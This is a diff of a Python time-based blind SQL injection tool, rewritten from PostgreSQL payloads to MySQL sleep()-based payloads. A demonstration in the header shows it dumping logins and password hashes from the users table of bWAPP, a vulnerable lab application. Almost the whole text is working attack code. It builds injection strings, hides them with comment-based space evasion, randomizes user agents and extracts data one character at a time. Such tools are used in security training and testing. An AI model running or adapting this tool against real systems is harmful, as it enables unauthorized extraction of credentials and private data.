@@ -1,11 +1,38 @@
 #!/usr/bin/python3
+#
+# DEMONSTRATION
+# $ python3 sqli_mysql_timed_blind_v2.py title,action get "1'" "" login,password users http://192.168.252.5/bWAPP/sqli_15.php 2
+# [?] Select a parameter to test for injection:: title
+#  > title
+#    action
+#
+# [*] Printing number of rows in table...
+# 2
+# [*] Found 2 rows of data in table 'users'
+#
+# [*] Retrieving 2 rows of data using 'login' as column and 'users' as table...
+# [*] Extracting strings from row 1...
+# A.I.M.
+# [*] Retrieved value 'A.I.M. ' for column 'login' in row 1
+# [*] Extracting strings from row 2...
+# bee
+# [*] Retrieved value 'bee' for column 'login' in row 2
+# [*] Retrieving 2 rows of data using 'password' as column and 'users' as table...
+# [*] Extracting strings from row 1...
+# 6885858486f31043e5839c735d99457f045affd0
+# [*] Retrieved value '6885858486f31043e5839c735d99457f045affd0' for column 'password' in row 1
+# [*] Extracting strings from row 2...
+# 6885858486f31043e5839c735d99457f045affd0
+# [*] Retrieved value '6885858486f31043e5839c735d99457f045affd0' for column 'password' in row 2
+# 
+# [+] Done!
+
 import requests
 import urllib3
 import os
 import sys
 import re
 import inquirer
-from urllib.parse import quote
 from random_useragent.random_useragent import Randomize     # Randomize useragent
 
 # Optionally, use a proxy
@@ -22,12 +49,16 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # Set timeout
 timeout = 10
 
+# Default string for empty values
+def_str = "search"
+
 # Specific settings for DBMS queries
-and_or = " AND "
 junk_str = "ABCD"
-junk_int = "1234"
-inj_prefix = and_or + junk_int
-def_str = "1234"
+and_or = "AND"
+
+# Injection prefix and suffix
+inj_prefix = and_or + " (select " + junk_str + " from (select(sleep("
+inj_suffix = ")))))" + junk_str + ") AND '" + junk_str + "'='" + junk_str
 
 # Decimal begin and end
 dec_begin = 48
@@ -49,31 +80,27 @@ def http_headers():
     useragent = Randomize().random_agent('desktop', 'windows')
     headers = {
         'User-Agent': useragent,
+        # 'Cookie':'PHPSESSID=07f0cc1a65fe553e25f321170e896781; security_level=0',
     }
     return headers
 
 # Perform the SQLi call for injection
 def sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
-    # Optionally modify injection string via regex for character evasion
-    #inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
-    #inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$
-    # inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
-    inj_regex_str = re.sub("'","$$",inj_str)              # Replace single quote for $$
+    comment_inj_str = re.sub(" ","/**/",inj_str)
     inj_params = dict()
 
     for param in params:
         inj_params[param] = def_str
         if param == inj_param:
-            inj_params[param] = inj_regex_str
+            inj_params[param] = comment_inj_str
 
     inj_params_unencoded = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())
-
+    
     # Do GET or POST
     if get_post.lower() == "get":
-        r = requests.get(url,params=inj_params,headers=headers,timeout=timeout,verify=False)
+        r = requests.get(url,params=inj_params_unencoded,headers=headers,timeout=timeout,verify=False)
     elif get_post.lower() == "post":
         r = requests.post(url,data=inj_params,headers=headers,timeout=timeout,verify=False)
-    # Check response timing
     res = r.elapsed.total_seconds()
     if res >= sleep:
         return True
@@ -86,49 +113,44 @@ def sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
 # Extract rows
 def get_rows(url,headers,get_post,prefix,suffix,inj_param,params,table,sleep):
     rows = ""
-    max_pos_rows = 10
+    max_pos_rows = 4
     # Get number maximum positional characters of rows: e.g. 1096,2122,1234,etc.
     for pos in range(1,max_pos_rows+1):
         # Test if current pos does have any valid value. If not, break
-        direction = quote(">",safe="")
-        inj_str = prefix + inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(*) AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + ")::text FROM " + str(pos) + " FOR 1))" + direction + "1) THEN (SELECT " + junk_int + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + junk_str + " END) AND '" + junk_str + "'='" + junk_str + suffix
+        direction = ">"
+        inj_str = prefix + inj_prefix + str(sleep) + "-(if(ORD(MID((select IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM " + table + ")," + str(pos) + ",1))" + direction + "1,0," + str(sleep) + inj_suffix + suffix
         if not sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
             break
         # Loop decimals
         direction = "="
         for num_rows in range(dec_begin,dec_end+1):
             row_char = chr(num_rows)
-            inj_str = prefix + inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(*) AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + ")::text FROM " + str(pos) + " FOR 1))" + direction + str(num_rows) + ") THEN (SELECT " + junk_int + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + junk_int + " END) AND '" + junk_str + "'='" + junk_str + suffix
+            inj_str = prefix + inj_prefix + str(sleep) + "-(if(ORD(MID((select IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM " + table + ")," + str(pos) + ",1))" + direction + str(num_rows) + ",0," + str(sleep) + inj_suffix + suffix
             if sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
                 rows += row_char
                 print(row_char,end='',flush=True)
                 break
-    if rows != "":
-        print("\n[*] Found " + rows + " rows of data in table '" + table + "'\n")
-        return int(rows)
-    else:
-        return 0
+    print("\n[*] Found " + rows + " rows of data in table '" + table + "'\n")
+    return int(rows)
 
 # Loop through positions and characters
 def get_data(url,headers,get_post,prefix,suffix,inj_param,params,row,column,table,sleep):
     extracted = ""
-    null = "NULL"
     max_pos_len = 50
-
     # Loop through length of string
     # Not very efficient, should use a guessing algorithm
     print("[*] Extracting strings from row " + str(row+1) + "...")
-    for pos in range(0,max_pos_len):
+    for pos in range(1,max_pos_len):
         # Test if current pos does have any valid value. If not, break
-        direction = quote(">",safe="")
-        inj_str = prefix + inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(" + column + " AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + " ORDER BY " + column + " OFFSET " + str(row) + " LIMIT 1)::text FROM " + str(pos) + " FOR 1))" + direction + str(guess) + ") THEN (SELECT " + junk_int + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + junk_int + " END) AND '" + junk_str + "'='" + junk_str + suffix
+        direction = ">"
+        inj_str = prefix + inj_prefix + str(sleep) + "-(if(ord(mid((select ifnull(cast(" + column + " as NCHAR),0x20) from " + table + " LIMIT " + str(row) + ",1)," + str(pos) + ",1))" + direction + str(ascii_begin) + ",0," + str(sleep) + inj_suffix + suffix
         if not sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
             break
         # Loop through ASCII printable characters
+        direction = "="
         for guess in range(ascii_begin,ascii_end+1):
             extracted_char = chr(guess)
-            direction = "="
-            inj_str = prefix + inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(" + column + " AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + " ORDER BY " + column + " OFFSET " + str(row) + " LIMIT 1)::text FROM " + str(pos) + " FOR 1))" + direction + str(guess) + ") THEN (SELECT " + junk_int + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + junk_int + " END) AND '" + junk_str + "'='" + junk_str + suffix
+            inj_str = prefix + inj_prefix + str(sleep) + "-(if(ord(mid((select ifnull(cast(" + column + " as NCHAR),0x20) from " + table + " LIMIT " + str(row) + ",1)," + str(pos) + ",1))" + direction + str(guess) + ",0," + str(sleep) + inj_suffix + suffix
             if sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
                 extracted += chr(guess)
                 print(extracted_char,end='',flush=True)
@@ -148,7 +170,7 @@ def main(argv):
         sleep = int(sys.argv[8])
     else:
         print("[*] Usage: " + sys.argv[0] + " <param1,param2,..> <get_or_post> <prefix> <suffix> <column1,column2,..> <table> <url> <sleep_in_seconds>")
-        print("[*] Example: " + sys.argv[0] + " apiKey,deviceName,longitude,latitude post \"1\" \";--+\" password_id,password,algorithm,salt aaapassword http://192.168.252.9/api/json/discovery/addDeviceToGMap 3\n")
+        print("[*] Example: " + sys.argv[0] + " title,action get \"1'\" \"\" login,password users http://192.168.252.5/bWAPP/sqli_15.php 2\n")
         exit(0)
 
     # Random headers
@@ -171,9 +193,9 @@ def main(argv):
         for column in columns:
             print("[*] Retrieving " + str(rows) + " rows of data using '" + column + "' as column and '" + table + "' as table...")
             for row in range(0,rows):
+                # rowval_len = get_length(url,headers,row,column,table)
                 retrieved = get_data(url,headers,get_post,prefix,suffix,inj_param,params,row,column,table,sleep)
                 print("\n[*] Retrieved value '" + retrieved + "' for column '" + column + "' in row " + str(row+1))
-    
         # Done
         print("\n[+] Done!\n")
     except requests.exceptions.Timeout:
